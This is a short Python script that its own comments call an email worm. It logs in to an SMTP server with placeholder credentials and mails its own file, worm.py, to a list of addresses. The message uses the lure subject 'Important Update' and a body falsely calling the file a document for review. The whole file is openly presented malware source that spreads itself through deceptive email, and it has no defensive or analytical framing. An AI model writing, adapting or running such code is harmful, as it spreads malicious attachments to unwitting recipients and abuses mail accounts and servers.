# This is the worm script that will be attached to the email.
# It should be a standalone Python script that can be executed to spread itself.

import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Function to send an email with the worm attachment
def send_worm_email(to_address):
    from_address = "your_email@example.com"
    password = "your_password"

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = "Important Update"

    body = "Please find the attached document for your review."
    msg.attach(MIMEText(body, 'plain'))

    attachment_path = 'worm.py'
    with open(attachment_path, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header(
        'Content-Disposition',
        f'attachment; filename= {os.path.basename(attachment_path)}',
    )
    msg.attach(part)

    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login(from_address, password)
    text = msg.as_string()
    server.sendmail(from_address, to_address, text)
    server.quit()

# Main function to execute the worm
def main():
    email_addresses = ["recipient1@example.com", "recipient2@example.com", "recipient3@example.com"]
    for email in email_addresses:
        send_worm_email(email)

if __name__ == "__main__":
    main()